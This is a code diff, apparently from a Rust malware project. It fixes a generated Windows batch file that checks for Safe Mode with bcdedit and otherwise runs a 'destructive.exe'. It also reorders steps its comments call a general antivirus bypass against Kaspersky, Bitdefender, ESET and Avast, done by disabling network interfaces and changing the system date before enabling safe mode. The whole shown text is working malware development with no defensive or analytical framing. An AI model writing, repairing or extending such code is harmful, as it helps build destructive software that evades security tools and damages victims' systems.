@@ -131,8 +131,7 @@ fn create_batch_file() -> io::Result<()> {
 bcdedit /enum {current} | findstr /i "safeboot"
 if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
-) 
-else (
+) else (
     echo Safe Mode is not enabled
     "C:\Program Files\utkudrk2\destructive.exe"
     exit
@@ -290,13 +289,13 @@ fn main() {
         std::process::exit(1); // Exit the program with a failure status
     }
 
-    // Step 2: Kaspersky, Bitdefender bypass (General Antivirus bypass)
-    if let Err(e) = change_system_date() {
-        eprintln!("Error changing system date: {}", e);
-    }
-
+    // Step 2: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
     if let Err(e) = disable_network_interfaces() {
         eprintln!("Error disabling network interfaces: {}", e);
+    }
+
+    if let Err(e) = change_system_date() {
+        eprintln!("Error changing system date: {}", e);
     }
 
     // Step 3: Enable safe mode
